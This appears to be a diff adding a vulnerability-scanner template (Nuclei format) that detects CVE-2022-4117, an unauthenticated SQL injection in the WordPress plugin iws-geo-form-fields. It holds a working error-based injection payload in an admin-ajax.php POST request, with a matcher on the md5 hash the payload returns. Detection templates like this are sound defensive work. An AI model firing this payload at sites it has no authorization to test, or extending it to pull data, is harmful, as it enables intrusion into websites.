@@ -1,0 +1,31 @@
+id: CVE-2022-4117
+info:
+  name: WordPress Plugin IWS SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    iws-geo-form-fields is an easy-to-use WordPress plugin that uses Ajax to dynamically populate select fields in your form. It can add Country - State - City select fields in your WordPress website. Versions <=1.0 have an unauthorized SQL injection vulnerability.
+  reference:
+    - https://wpscan.com/vulnerability/1fac3eb4-13c0-442d-b27c-7b7736208193
+  tags: sql-injection,wordpress,plugin
+  classification:
+    cve-id: CVE-2022-4117
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php?action=iws_gff_fetch_states HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        country_id=1 and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(123456)))a from information_schema.tables group by a)b)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
